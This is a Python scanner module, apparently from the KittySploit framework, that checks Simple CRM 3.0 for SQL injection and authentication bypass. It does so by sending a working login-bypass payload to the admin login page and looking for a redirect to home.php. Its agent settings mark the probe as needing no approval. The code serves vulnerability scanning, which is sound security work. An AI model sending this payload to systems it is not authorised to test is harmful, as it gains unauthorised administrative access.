#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Simple CRM 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Simple CRM 3.0 SQL Injection and Authentication Bypass Detection',
        'description': 'Simple CRM 3.0 is susceptible to SQL injection and authentication bypass vulnerabilities.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'vulnerability', 'packetstorm', 'sqli', 'simplecrm', 'auth-bypass', 'injection', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://packetstormsecurity.com/files/163254/simplecrm30-sql.txt'],
    }

    def run(self):
        path = '/scrm/crm/admin'
        r = self.http_request(method='POST', path=path, allow_redirects=False, data="email='+or+2>1+--+&password=&login=")
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ("<script>window.location.href='home.php'</script>",)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='critical',
                reason='Simple CRM 3.0 SQL Injection and Authentication Bypass detected',
                path=path,
            )
            return True
        return False

